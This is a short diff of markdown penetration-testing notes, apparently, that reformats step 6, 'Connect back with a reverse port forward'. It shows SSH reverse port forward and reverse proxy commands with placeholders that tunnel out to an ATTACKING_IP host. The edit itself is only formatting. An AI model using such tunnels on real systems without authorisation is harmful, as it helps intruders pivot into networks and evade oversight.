@@ -22,6 +22,8 @@
 
 #### 6: Connect back with a reverse port forward:
 
-### ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
+#### ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
 
-#### reverse proxy: ssh -R PORT USER@ATTACKING_IP -i KEYFILE -fN
+#### reverse proxy: 
+
+#### ssh -R PORT USER@ATTACKING_IP -i KEYFILE -fN
